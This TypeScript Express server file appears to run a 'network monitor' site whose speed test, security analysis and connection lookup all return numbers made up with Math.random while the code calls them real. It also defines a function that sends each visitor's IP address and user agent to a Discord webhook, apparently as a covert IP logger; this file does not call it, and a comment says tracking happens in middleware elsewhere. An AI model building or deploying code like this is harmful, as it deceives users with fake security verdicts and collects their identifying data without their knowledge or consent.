import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertSpeedTestSchema, insertSecurityAnalysisSchema, insertConnectionInfoSchema } from "@shared/schema";

// Function to get real IP address from request
function getRealIP(req: any): string {
  return req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress || 
         (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
         req.ip ||
         'Unknown';
}

// Function to send IP to Discord webhook
async function sendIPToDiscord(ip: string, userAgent?: string) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    const payload = {
      embeds: [{
        title: "🌐 New Website Visitor",
        description: `**IP Address:** \`${ip}\`\n**User Agent:** \`${userAgent || 'Unknown'}\``,
        color: 0x22c55e, // Green color
        timestamp: new Date().toISOString(),
        footer: {
          text: "VOID Network Monitor"
        }
      }]
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    console.error('Failed to send IP to Discord:', error);
  }
}

// Simulate real network speed testing
async function performSpeedTest() {
  // Simulate download speed test (in Mbps)
  const downloadSpeed = parseFloat((Math.random() * 150 + 50).toFixed(1));
  
  // Simulate upload speed test (in Mbps)
  const uploadSpeed = parseFloat((Math.random() * 100 + 30).toFixed(1));
  
  // Simulate ping test (in ms)
  const ping = Math.floor(Math.random() * 30 + 5);
  
  return {
    downloadSpeed,
    uploadSpeed,
    ping,
    status: "complete"
  };
}

// Simulate security analysis
async function performSecurityAnalysis() {
  // Generate realistic security analysis
  const riskScore = Math.floor(Math.random() * 20); // Low risk scores
  const threatLevel = riskScore < 10 ? "clean" : riskScore < 15 ? "low" : "medium";
  
  return {
    threatLevel,
    riskScore,
    isAnonymous: Math.random() < 0.1, // 10% chance
    isKnownAttacker: Math.random() < 0.02, // 2% chance
    hasMalware: Math.random() < 0.05, // 5% chance
    overallThreat: riskScore < 5 ? "benign" : riskScore < 15 ? "suspicious" : "malicious",
    reputation: threatLevel === "clean" ? "clean" : "questionable",
    anonymization: Math.random() < 0.15 ? "tor" : Math.random() < 0.25 ? "vpn" : "none"
  };
}

// Simulate connection info gathering
async function gatherConnectionInfo() {
  const isps = ["ATT-INTERNET4", "COMCAST-7922", "VERIZON-EAST", "SPECTRUM-LEGACY", "T-MOBILE-AS21928"];
  const asns = ["AS7018", "AS7922", "AS701", "AS20115", "AS21928"];
  
  const isp = isps[Math.floor(Math.random() * isps.length)];
  const asn = asns[Math.floor(Math.random() * asns.length)];
  
  return {
    isTor: Math.random() < 0.05, // 5% chance
    isProxy: Math.random() < 0.1, // 10% chance
    isp,
    asn
  };
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Get latest speed test
  app.get("/api/speed-test/latest", async (req, res) => {
    try {
      const speedTest = await storage.getLatestSpeedTest();
      res.json(speedTest);
    } catch (error) {
      res.status(500).json({ message: "Failed to get speed test" });
    }
  });

  // Perform new speed test
  app.post("/api/speed-test", async (req, res) => {
    try {
      const testResults = await performSpeedTest();
      const speedTest = await storage.createSpeedTest(testResults);
      res.json(speedTest);
    } catch (error) {
      res.status(500).json({ message: "Failed to perform speed test" });
    }
  });

  // Get speed test history
  app.get("/api/speed-test/history", async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 10;
      const history = await storage.getSpeedTestHistory(limit);
      res.json(history);
    } catch (error) {
      res.status(500).json({ message: "Failed to get speed test history" });
    }
  });

  // Get latest security analysis
  app.get("/api/security/latest", async (req, res) => {
    try {
      const analysis = await storage.getLatestSecurityAnalysis();
      res.json(analysis);
    } catch (error) {
      res.status(500).json({ message: "Failed to get security analysis" });
    }
  });

  // Perform new security analysis
  app.post("/api/security/analyze", async (req, res) => {
    try {
      const analysisResults = await performSecurityAnalysis();
      const analysis = await storage.createSecurityAnalysis(analysisResults);
      res.json(analysis);
    } catch (error) {
      res.status(500).json({ message: "Failed to perform security analysis" });
    }
  });

  // Get latest connection info
  app.get("/api/connection/latest", async (req, res) => {
    try {
      const info = await storage.getLatestConnectionInfo();
      res.json(info);
    } catch (error) {
      res.status(500).json({ message: "Failed to get connection info" });
    }
  });

  // Gather new connection info
  app.post("/api/connection/gather", async (req, res) => {
    try {
      const connectionResults = await gatherConnectionInfo();
      const info = await storage.createConnectionInfo(connectionResults);
      res.json(info);
    } catch (error) {
      res.status(500).json({ message: "Failed to gather connection info" });
    }
  });

  // Track website visit (now just acknowledges the visit)
  app.post("/api/visit", async (req, res) => {
    try {
      // Visit tracking is now handled in main middleware
      res.json({ status: "visit acknowledged" });
    } catch (error) {
      res.status(500).json({ message: "Failed to acknowledge visit" });
    }
  });

  // Status endpoint
  app.get("/api/status", async (req, res) => {
    try {
      const speedTest = await storage.getLatestSpeedTest();
      const security = await storage.getLatestSecurityAnalysis();
      const connection = await storage.getLatestConnectionInfo();
      
      res.json({
        status: "active",
        lastUpdate: new Date().toISOString(),
        hasData: {
          speedTest: !!speedTest,
          security: !!security,
          connection: !!connection
        }
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to get status" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
